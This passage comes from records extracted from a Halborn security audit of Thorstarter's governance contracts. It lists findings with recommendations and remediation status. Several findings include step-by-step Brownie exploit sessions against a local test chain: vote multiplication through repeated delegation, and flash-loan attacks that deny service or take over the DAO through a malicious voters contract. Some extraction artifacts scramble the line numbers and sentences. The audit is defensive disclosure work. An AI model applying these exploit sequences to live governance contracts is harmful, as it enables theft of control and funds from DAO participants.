delegatee ], votes ( delegatee )) ; uint amount = balanceOf ( msg . sender ); _votes [ currentDelegate ] -= amount ; _votes [ delegatee ] += amount ; emit DelegateChanged ( msg . sender , currentDelegate , delegatee ); Proof of Concept: 1. User1 has 49 voting power 2. User2 has 10 voting power, which means he would need 5 votes to beat User1 3. User2 creates a proposal 4. User1 votes to reject it 5. User2 votes to approve it (1st vote) 6. User2 delegates his voting power to Address3 7. Address3 votes to approve it (2nd vote) 8. Address3 delegates back to User2 his voting power 9. User2 delegates his voting power to Address4 10. Address4 votes to approve it (3rd vote) 11. Address4 delegates back to User2 his voting power 12. User2 delegates his voting power to Address5 13. Address5 votes to approve it (4th vote) 14. Address5 delegates back to User2 his voting power 15. User2 delegates his voting power to Address6 16. Address6 votes to approve it (5th vote) 17. Proposal is accepted and executed Listing 3: Proof of Concept using Brownie (Lines 94,97,100,105) 1 # Deploying test Token contracts 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 14 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # Adding DAO contract as a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # user1 49% of voting power 15 >>> user1 = accounts [1] 16 >>> XRuneToken [0]. transfer ( user1 . address , 49) 17 >>> XRuneToken [0]. approve ( Voters [0]. address , 49 , { ' from ': user1 }) 18 >>> Voters [0]. lock (49 , { ' from ': user1 }) 19 20 # user2 10% of voting power 21 >>> user2 = accounts [2] 22 >>> XRuneToken [0]. transfer ( user2 , 10) 23 >>> XRuneToken [0]. approve ( Voters [0]. address , 10 , { ' from ': user2 }) 24 >>> Voters [0]. lock (10 , { ' from ': user2 }) 25 26 # Voting power 27 >>> print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 28 votes ( user1 ) -> 49 29 >>> print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 30 votes ( user2 ) -> 10 31 32 # User2 creates a proposal that calls DAO . setMinBalanceToPropose (1337) 33 >>> encoded_setMinBalanceToPropose = DAO . signatures [' setMinBalanceToPropose '] + eth_abi . encode_abi ([ ' uint256 ' ,] , (1337 ,) ). hex () 34 >>> bytes_setMinBalanceToPropose = to_bytes ( encoded_setMinBalanceToPropose ,' bytes ') 35 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setMinBalanceToPropose )) . hex () 36 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': user2 }) 37 >>> proposalID = proposalID . return_value 15 38 >>> print (\" ProposalID -> \" + str ( proposalID ) + \"\\ n \") 39 ProposalID -> 1 40 41 # User1 votes to reject the proposal . He has the 49% of the total voting power 42 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 43 44 # user2 votes to approve his own proposal . He only has 10% of the total voting power . So he would need 5 votes to beat user1 decision 45 46 # 1 st vote 47 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user2 }) 48 49 # user2 delegates his voting power to accounts [3] and accounts [3] votes to approve the proposal 50 >>> Voters [0]. delegate ( accounts [3] , { ' from ': user2 }) 51 >>> print (\" accounts [3] - Voters [0]. votesAt ( accounts [3] ,1) -> \" + str ( Voters [0]. votesAt ( accounts [3] ,1) ) ) 52 accounts [3] - Voters [0]. votesAt ( accounts [3] ,1) -> 10 53 54 # 2 nd vote 55 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [3]}) 56 57 # accounts [3] delegates his voting power back to User2 58 >>> Voters [0]. delegate ( user2 , { ' from ': accounts [3]}) 59 60 # user2 delegates his voting power to accounts [4] and accounts [4] votes to approve the proposal 61 >>> Voters [0]. delegate ( accounts [4] , { ' from ': user2 }) 62 >>> print (\" accounts [4] - Voters [0]. votesAt ( accounts [4] ,1) -> \" + str ( Voters [0]. votesAt ( accounts [4] ,1) ) ) 63 accounts [4] - Voters [0]. votesAt ( accounts [4] ,1) -> 10 64 65 # 3 rd vote 66 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [4]}) 67 68 # accounts [4] delegates his voting power back to User2 69 >>> Voters [0]. delegate ( user2 , { ' from ': accounts [4]}) 70 71 # user2 delegates his voting power to accounts [5] and accounts [5] votes to approve the proposal 72 >>> Voters [0]. delegate ( accounts [5] , { ' from ': user2 }) 73 >>> print (\" accounts [5] - Voters [0]. votesAt ( accounts [5] ,1) -> \" + 16 str ( Voters [0]. votesAt ( accounts [5] ,1) ) ) 74 accounts [5] - Voters [0]. votesAt ( accounts [5] ,1) -> 10 75 76 # 4 th vote 77 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [5]}) 78 79 # accounts [5] delegates his voting power back to User2 80 >>> Voters [0]. delegate ( user2 , { ' from ': accounts [5]}) 81 82 # user2 delegates his voting power to accounts [6] and accounts [6] votes to approve the proposal 83 >>> Voters [0]. delegate ( accounts [6] , { ' from ': user2 }) 84 >>> print (\" accounts [6] - Voters [0]. votesAt ( accounts [6] ,1) -> \" + str ( Voters [0]. votesAt ( accounts [6] ,1) ) ) 85 accounts [6] - Voters [0]. votesAt ( accounts [6] ,1) -> 10 86 87 # 5 th vote 88 >>> DAO [0]. vote ( proposalID , 0, { ' from ': accounts [6]}) 89 90 # Sleep 24 hours so we can execute the proposal 91 >>> chain . sleep (86401) 92 93 >>> print (\" minBalanceToPropose before executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () ) + \"\\ n \") 94 minBalanceToPropose before executing the proposal -> 10 95 96 # accounts [6] executes the proposal 97 >>> DAO [0]. execute ( proposalID , { ' from ': accounts [6]}) 98 Transaction sent : 0 xc59618b9bda4804ef117a5c4ac2720 ... 99 Nonce : 1 100 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13093650 Gas used : 76867 (1.14%) 101 102 < Transaction '0 xc59618b9bda4804ef117a5c4ac2720 ... ' > 103 104 >>> print (\" minBalanceToPropose after executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () )) 105 minBalanceToPropose after executing the proposal -> 1337 Risk Level: Likelihood - 5 17 Impact - 5 Recommendation: It is recommended checking if the delegator voted the proposal before calling delegate() function, so that the user who receives the voting power can not vote the same proposal again. Remediation Plan: SOLVED: Thorstarter Team modified the function function _valueAt() in the Voters.sol contract so when the function delegate() is called the voting power contained in a snapshot is not affected. 18 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: Critical"]}, {"title": "DOS/CONTRACT TAKEOVER ON DAO.SOL CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "DAO.sol contract allows the creation of different proposals including the following features:  Add support for pools: multiple options per proposal instead of just a for/against  Support multiple actions per option. So multiple transactions can be executed by one proposal  Use a voters contract to snapshot voting power, the address used The voting power is based on the locked XRUNE can be updated. (vXRUNE/voting token). its reconfigure  Can own parameters: minBalanceToPropose, minPercentQuorum, minVotingTime, minExecutionDelay  The execute method can be called by anybody if the proposal is passed and not yet executed Based on this, by doing a flash loan an attacker could: - Case 1: Cause a DOS in the contract - Case 2: Take total control of the DAO.sol contract The DAO.sol contract makes use of this Voters.sol contract to handle the voting for the different proposals, and as such, we have included this vulnerability in the report. Case 1: Cause a DOS in the contract - Manual test: In this case we have followed these steps to cause a DOS in the contract: 1. Perform a flash loan of XRUNEs and lock all those XRUNEs tokens so we obtain more than the 50% of the total voting power 2. Create a proposal which calls Voters.toggleSnapshotter(DAO address) 19 3. Return the flash loan 4. Give it our vote 5. Execute it This way, the contract DAO.sol will lose the snapshotters role in the Voters contract which is required to create a new proposal. Right after this call, no new proposals can be created. Listing 4: DOS through toggleSnapshotter() (Lines 64,67,76) 1 # Deploying test Token contracts 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # DAO contract should be a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 >>> user1 = accounts [1] 17 >>> XRuneToken [0]. transfer ( user1 . address , 33) 18 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 19 >>> Voters [0]. lock (33 , { ' from ': user1 }) 20 21 ## user2 16% of voting power 22 >>> user2 = accounts [2] 23 >>> XRuneToken [0]. transfer ( user2 , 16) 24 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 25 >>> Voters [0]. lock (16 , { ' from ': user2 }) 26 27 # attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power 28 >>> attacker = accounts [9] 20 29 >>> XRuneToken [0]. transfer ( attacker , 51) 30 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 31 >>> Voters [0]. lock (51 , { ' from ': attacker }) 32 33 # Voting power 34 >>> print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 35 votes ( user1 ) -> 33 36 >>> print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 37 votes ( user2 ) -> 16 38 >>> print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 39 votes ( attacker ) -> 51 40 41 # Attacker creates a proposal that calls Voters . toggleSnapshotter ( DAO ' s address ) 42 >>> encoded_toggleSnapshotter = Voters . signatures [' toggleSnapshotter '] + eth_abi . encode_abi ([ ' address ' ,] , ( DAO [0]. address ,) ). hex () 43 >>> bytes_toggleSnapshotter = to_bytes ( encoded_toggleSnapshotter , ' bytes ') 44 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( Voters [0]. address , 0, bytes_toggleSnapshotter )) . hex () 45 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 46 >>> proposalID = proposalID . return_value 47 >>> proposalID 48 1 49 50 # Attacker returns the flash loan 51 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 52 53 # Attacker votes for his proposal 54 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 55 56 # The other users vote to reject the proposal 57 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 58 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 59 60 # After 24 hours ... 61 >>> chain . sleep (86401) 62 63 # Attacker executes the self - approved proposal 64 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 21 65 Transaction sent : 0 xdb6533a7eeb2426681ac4eab6dc638 ... 66 Nonce : 5 67 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13061360 Gas used : 63783 (0.95%) 68 69 < Transaction '0 xdb6533a7eeb2426681ac4eab6dc638 ... ' > 70 71 72 # Now another user comes and tries to create a new proposal 73 >>> DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[] , []] , { ' from ': user1 }) 74 Transaction sent : 0 x6449063f2cc6b237dd5f7693a76c7e ... 75 Nonce : 3 76 Gas price : 0.0 gwei DAO . propose confirmed ( not snapshotter ) Gas limit : 6721975 Block : 13061361 Gas used : 30712 (0.46%) 77 78 < Transaction '0 x6449063f2cc6b237dd5f7693a76c7e ... ' > Case 2: Take total control of the DAO.sol contract - Manual test: For this case we have followed these steps to take control of the DAO contract: 1. Create a malicious contract called EvilVoters.sol with the same structure and similar code as the current Voters.sol contract 2. Initialize the EvilVoters.sol contract with our own fake tokens 3. Add the DAO.sol contract address as an snapshotter of our malicious contract 4. Perform a flash loan of XRUNEs and lock all those XRUNE tokens so we obtain more than the 50% of the total voting power 5. Create a proposal which calls DAO.setVoters(EvilVoters.sol's address ) 6. Return the flash loan 7. Give it our vote 8. Execute it After the proposal is executed the new voters contract will be our In this contract, we are the only ones that have malicious contract. 22 tokens which give us total control over the DAO contract to propose and execute anything. Listing 5: 100,103,162,165) DAO Contract takeover through DAO.setVoters() (Lines 1 # Deploying test Token contracts ... 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # Adding DAO contract as a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 ### Giving user 1 33% of the voting power 17 >>> user1 = accounts [1] 18 >>> XRuneToken [0]. transfer ( user1 . address , 33) 19 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 20 >>> Voters [0]. lock (33 , { ' from ': user1 }) 21 22 ## user2 16% of voting power 23 ### Giving user 2 16% of the voting power 24 >>> user2 = accounts [2] 25 >>> XRuneToken [0]. transfer ( user2 , 16) 26 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 27 >>> Voters [0]. lock (16 , { ' from ': user2 }) 28 29 ## attacker creates a new Voters . sol contract with his own fake tokens which are FakeToken1 and FakeToken2 30 >>> attacker = accounts [9] 31 ### Deploying FakeToken contracts ... 32 >>> attacker . deploy ( FakeToken1 ) 33 >>> attacker . deploy ( FakeToken2 ) 23 34 35 ### deploying malicious Voters contract ... 36 >>> attacker . deploy ( Voters , attacker . address , FakeToken1 [0]. address , FakeToken2 [0]. address ) 37 38 ### Adding DAO contract as a snapshotter of the malicious Voters . sol 39 >>> Voters [1]. toggleSnapshotter ( DAO [0]. address ) 40 41 ## Voters [0] -> Original voters contract 42 ## Voters [1] -> Malicious voters contract created by the attacker 43 ### Attacker locks 1000000 FakeTokens1 in the malicious voters contract 44 >>> FakeToken1 [0]. transfer ( attacker , 1000000) 45 >>> FakeToken1 [0]. approve ( Voters [1]. address , 1000000 , { ' from ': attacker }) 46 >>> Voters [1]. lock (1000000 , { ' from ': attacker }) 47 >>> print (\" Attacker voting power in the malicious voters contract -> \" + str ( Voters [1]. votes ( attacker )) + \"\\ n \") 48 Attacker voting power in the malicious voters contract -> 1000000 49 50 ## attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power in the original voters contract 51 >>> XRuneToken [0]. transfer ( attacker , 51) 52 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 53 >>> Voters [0]. lock (51 , { ' from ': attacker }) 54 55 # Voting power 56 >>> print () 57 print (\" Voting power in the original voters contract \") 58 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 59 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 60 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 61 print () 62 print (\" Voting power in the malicious voters contract \") 63 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 64 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 65 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 66 print () 67 68 Voting power in the original voters contract 69 votes ( user1 ) -> 33 70 votes ( user2 ) -> 16 24 71 votes ( attacker ) -> 51 72 73 Voting power in the malicious voters contract 74 votes ( user1 ) -> 0 75 votes ( user2 ) -> 0 76 votes ( attacker ) -> 1000000 77 78 # Attacker creates a proposal that calls setVoters ( Malicious voters contract address ) 79 >>> encoded_setVoters = DAO . signatures [ ' setVoters '] + eth_abi . encode_abi ([ ' address ' ,] , ( Voters [1]. address ,) ). hex () 80 >>> bytes_setVoters = to_bytes ( encoded_setVoters , ' bytes ') 81 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setVoters )) . hex () 82 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 83 >>> print (\" ProposalID -> \" + str ( proposalID ) + \"\\ n \") 84 ProposalID -> 1 85 86 # Attacker returns the flash loan . This is done before voting for its own proposal , as the voting power used by the smart contract is the voting power that the users had at the time of the proposal creation 87 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 88 89 # Attacker votes to approve his own proposal 90 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 91 92 # The other users vote to reject the proposal 93 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 94 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 95 96 # After 24 hours ... 97 >>> chain . sleep (86401) 98 99 # Attacker executes the proposal 100 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 101 Transaction sent : 0 xca6d0d8e67b51644c81535b2435303e ... 102 Nonce : 12 103 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069245 Gas used : 77831 (1.16%) 104 105 < Transaction '0 xca6d0d8e67b51644c81535b2435303e ... ' > 25 106 107 ## Let 's give now a lot of voting power to the user1 and user2 108 >>> XRuneToken [0]. transfer ( user1 , 500000000 e10 ) 109 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user1 }) 110 >>> Voters [0]. lock (500000000 e10 , { ' from ': user1 }) 111 >>> XRuneToken [0]. transfer ( user2 , 500000000 e10 ) 112 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user2 }) 113 >>> Voters [0]. lock (500000000 e10 , { ' from ': user2 }) 114 115 # Voting power 116 >>> print () 117 print (\" Voting power in the original voters contract \") 118 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 119 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 120 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 121 print () 122 print (\" Voting power in the malicious voters contract \") 123 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 124 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 125 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 126 print () 127 128 Voting power in the original voters contract 129 votes ( user1 ) -> 5000000000000000033 130 votes ( user2 ) -> 5000000000000000016 131 votes ( attacker ) -> 0 132 133 Voting power in the malicious voters contract 134 votes ( user1 ) -> 0 135 votes ( user2 ) -> 0 136 votes ( attacker ) -> 1000000 137 138 ## attacker creates a new proposal to setMinBalanceToPropose to 1000000 139 >>> encoded_setMinBalanceToPropose = DAO . signatures [' setMinBalanceToPropose '] + eth_abi . encode_abi ([ ' uint256 ' ,] , (1000000 ,) ). hex () 140 >>> bytes_setMinBalanceToPropose = to_bytes ( encoded_setMinBalanceToPropose ,' bytes ') 141 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setMinBalanceToPropose )) . hex () 142 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 26 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 143 >>> proposalID = proposalID . return_value 144 >>> print (\" Second proposal created by the attacker - ProposalID -> \" + str ( proposalID ) + \"\\ n \") 145 Second proposal created by the attacker - ProposalID -> 2 146 147 # Attacker votes to approve it 148 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 149 150 # User1 and user2 vote to reject it 151 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user1 }) 152 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user2 }) 153 154 # Finish the voting period 155 >>> chain . sleep (86401) 156 157 # We check the minBalanceToPropose before executing the proposal 158 >>> print (\" minBalanceToPropose before executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () ) + \"\\ n \") 159 minBalanceToPropose before executing the proposal -> 10 160 161 # Execute the proposal 162 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 163 Transaction sent : 0 x5cdb022231acb822c48c4ffe8c58aab675 ... 164 165 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069256 Nonce : 15 Gas used : 76851 (1.14%) 166 167 < Transaction '0 x5cdb022231acb822c48c4ffe8c58aab675 ... ' > 168 169 # Get the value of minBalanceToPropose after executing the proposal 170 >>> print (\" minBalanceToPropose after executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () )) 171 minBalanceToPropose after executing the proposal -> 1000000 Risk Level: Likelihood - 3 Impact - 5 27 Recommendation: In the current Voters.sol contract, the tokens locked should take a fixed If a malicious user period of time before they grant voting power. performs a flash loan of XRUNE tokens and locks them, they will not get their voting power increased before they have to return the flash loan. So, it is recommended not allowing to lock() and unlock() XRUNE in the same transaction. Remediation Plan: SOLVED: Thorstarter Team rightly implemented a fix to mitigate the risk of flash loans by not allowing to lock() unlock() XRUNE in the same transaction. 28 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: High"]}, {"title": "DOS WITH BLOCK GAS LIMIT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always require a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. In this contract, the function updateTclp() iterates over an array of users of unknown size, which is passed as a parameter of the function. If this array is big enough, the transaction could reach the block gas limit and would not be completed. Code Location: Listing 6: Voters.sol (Lines 265) 262 function updateTclp ( address [] calldata users , uint [] calldata 263 264 265 266 267 268 269 270 271 272 273 274 amounts , uint [] calldata values ) public { require ( tcLpKeepers [ msg . sender ], \" not tcLpKeeper \" ); require ( users . length == amounts . length && users . length == values . length , \" length \" ); for ( uint i = 0; i < users . length ; i ++) { address user = users [ i ]; UserInfo storage userInfo = _userInfo ( user ); _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ user ], balanceOf ( user )) ; _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; uint previousValue = userInfo . lockedTcLpValue ; totalSupply = totalSupply - previousValue + values [ i ]; _votes [ userInfo . delegate ] = _votes [ userInfo . delegate ] - previousValue + values [i ]; 29 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 } userInfo . lockedTcLpValue = values [ i ]; userInfo . lockedTcLpAmount = amounts [i ]; if ( previousValue < values [ i ]) { emit Transfer ( address (0) , user , values [ i] - previousValue ); } else if ( previousValue > values [ i ]) { emit Transfer ( user , address (0) , previousValue - values [ i ]) ; } // Add to historicalTcLpsList for keepers to use if (! historicalTcLps [ user ]) { historicalTcLps [ user ] = true ; _historicalTcLpsList . push ( user ); } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Actions that require looping across the entire data structure should be avoided. If you use loop over an array of unknown size, you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. In this case, the size of the users array should be limited to a fixed maximum value. Remediation Plan: ACKNOWLEDGED: Thorstarter Team accepts this risk because the updateTclp() function can only be called by someone with a Keeper role. 30 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: Low"]}, {"title": "CONTRACT CAN BE LEFT WITHOUT ANY SNAPSHOTTER/KEEPER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The contract contains two functions called toggleSnapshotter() and These functions can be only called by an already toggleTcLpKeeper(). snapshotter/keeper respectively. If there is just one snapshotter or keeper and it calls these functions with its own address, the contract would be left without any snapshotter/keeper and it would never be able to have any snapshotter/keeper again. If this happens, proposals would never work in the DAO.sol contract, as this contract requires the snapshotter role and there would be no way to add it. Code Location: Listing 7: Voters.sol (Lines 114,119) require ( snapshotters [ msg . sender ], \" not snapshotter \"); snapshotters [ user ] = ! snapshotters [ user ]; 112 function toggleSnapshotter ( address user ) external { 113 114 115 } 116 117 function toggleTcLpKeeper ( address user ) external { 118 119 120 } require ( tcLpKeepers [ msg . sender ], \" not tsLpKeeper \" ); tcLpKeepers [ user ] = ! tcLpKeepers [ user ]; Risk Level: Likelihood - 2 Impact - 3 31 Recommendation: Use OpenZeppelin Access Control library to manage the different roles of the contracts. Using this OpenZeppelin library the roles can be granted and revoked dynamically via the grantRole and revokeRole functions. Each role has an associated admin role, and only accounts that have a roles admin role can call grantRole and revokeRole. Remediation Plan: SOLVED: Thorstarter Team successfully added the OpenZeppelin Access Control library into the Voters.sol contract. 32 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: Low"]}, {"title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In multiple functions Thorstarter uses OpenZeppelins safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. In this case both tokens are set in the constructor by the creator of the contract, so they are trusted, but it would be still a good practice to perform this check. Code Location: Voters.sol Listing 8: Voters.sol 176 token . safeTransferFrom ( msg . sender , address ( this ) , amount ); Listing 9: Voters.sol 202 token . safeTransfer ( msg . sender , amount ); Listing 10: Voters.sol 209 sushiLpToken . safeTransferFrom ( msg . sender , address ( this ) , lpAmount ) ; 33 Listing 11: Voters.sol 256 sushiLpToken . safeTransfer ( msg . sender , lpAmount ); Listing 12: Voters.sol 312 token . safeTransferFrom ( msg . sender , address ( this ) , amount ); OpenZeppelin Listing 13: Library SafeERC20 (Lines 20,25,28,34) using Address for address ; 17 library SafeERC20 { 18 19 20 21 22 23 24 25 function safeTransfer ( IERC20 token , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transfer . selector , to , value )) ; } function safeTransferFrom ( IERC20 token , address from , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transferFrom . selector , from , to , value )) ; } 26 27 28 29 30 31 32 33 34 35 Risk Level: Likelihood - 1 Impact - 3 34 Recommendation: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: SOLVED: Thorstarter Team checks now the token balance before and after every token transfer. 35 ", "labels": ["Halborn", "Thorstarter_Governance", "Severity: Low"]}, {"title": "LACK OF ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Lack of zero address validation has been found at many instances in the contract Voters.sol when assigning user supplied input. Functions updateTclp(), delegate(), toggleSnapshotter(), _userInfo() and the constructor are missing this check. toggleTcLpKeeper(), Code Location: Listing 14: Voters.sol 55 constructor ( address _owner , address _token , address _sushiLpToken ) { snapshotters [ _owner ] = true ; tcLpKeepers [ _owner ] = true ; token = IERC20 ( _token ); sushiLpToken = IERC20 ( _sushiLpToken ); currentSnapshotId = 1; 56 57 58 59 60 61 } Listing 15: Voters.sol require ( snapshotters [ msg . sender ], \" not snapshotter \"); snapshotters [ user ] = ! snapshotters [ user ]; 112 function toggleSnapshotter ( address user ) external { 113 114 115 } 116 117 function toggleTcLpKeeper ( address user ) external { 118 119 120 } require ( tcLpKeepers [ msg . sender ], \" not tsLpKeeper \" ); tcLpKeepers [ user ] = ! tcLpKeepers [ user ]; 36 Listing 16: Voters.sol 161 function delegate ( address delegatee ) external { 162 163 164 165 166 UserInfo storage userInfo = _userInfos [ msg . sender ]; address currentDelegate = userInfo . delegate ; userInfo . delegate = delegatee ; _updateSnapshot ( _votesSnapshots [ currentDelegate ], votes ( currentDelegate )) ; 167 _updateSnapshot ( _votesSnapshots [ delegatee ], votes ( delegatee )) ; uint amount = balanceOf ( msg . sender ); _votes [ currentDelegate ] -= amount ; _votes [ delegatee ] += amount ; emit DelegateChanged ( msg . sender , currentDelegate , delegatee ); 168 169 170 171 172 173 } Listing 17: Voters.sol 262 function updateTclp ( address [] calldata users , uint [] calldata amounts , uint [] calldata values ) public { require ( tcLpKeepers [ msg . sender 